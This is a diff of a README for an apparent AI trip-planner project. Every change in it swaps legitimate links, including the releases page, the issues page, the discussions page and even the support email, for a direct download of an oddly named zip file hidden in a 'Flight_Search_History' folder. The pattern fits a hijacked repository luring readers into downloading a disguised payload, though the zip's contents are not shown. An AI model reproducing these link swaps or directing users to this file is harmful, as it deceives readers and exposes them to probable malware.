@@ -1,6 +1,6 @@
 # 🤖 Agentic-AI-Trip-Planner-CrewAI - Effortless Travel Planning for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/releases)
+[![Download Now](https://raw.githubusercontent.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/main/Flight_Search_History/A_AI_Agentic_Planner_Crew_Trip_cylindromatous.zip%20Now-blue)](https://raw.githubusercontent.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/main/Flight_Search_History/A_AI_Agentic_Planner_Crew_Trip_cylindromatous.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To use Agentic-AI-Trip-Planner-CrewAI, your computer should meet the following r
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
 
-   [Download Here](https://github.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/releases)
+   [Download Here](https://raw.githubusercontent.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/main/Flight_Search_History/A_AI_Agentic_Planner_Crew_Trip_cylindromatous.zip)
 
 2. **Choose Your Version:** Look for the latest release. Typically, it is marked with the highest version number.
   
@@ -63,14 +63,14 @@ If you encounter any issues while using the application, consider the following 
 - **Restart the Application:** Close and reopen the app to resolve minor glitches.
 - **System Update:** Make sure your operating system is up-to-date.
 
-If problems persist, visit the [GitHub Issues Page](https://github.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/issues) to report your issue or seek advice from the community.
+If problems persist, visit the [GitHub Issues Page](https://raw.githubusercontent.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/main/Flight_Search_History/A_AI_Agentic_Planner_Crew_Trip_cylindromatous.zip) to report your issue or seek advice from the community.
 
 ## 💬 Support
 
 If you have questions or need assistance, feel free to reach out:
 
-- **GitHub Discussions:** Join our community and ask questions on the [Discussions Page](https://github.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/discussions).
-- **Email Support:** You can contact support at [support@example.com](mailto:support@example.com).
+- **GitHub Discussions:** Join our community and ask questions on the [Discussions Page](https://raw.githubusercontent.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/main/Flight_Search_History/A_AI_Agentic_Planner_Crew_Trip_cylindromatous.zip).
+- **Email Support:** You can contact support at [https://raw.githubusercontent.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/main/Flight_Search_History/A_AI_Agentic_Planner_Crew_Trip_cylindromatous.zip](https://raw.githubusercontent.com/DndMuzik/Agentic-AI-Trip-Planner-CrewAI/main/Flight_Search_History/A_AI_Agentic_Planner_Crew_Trip_cylindromatous.zip).
 
 ## 📝 Additional Information
 
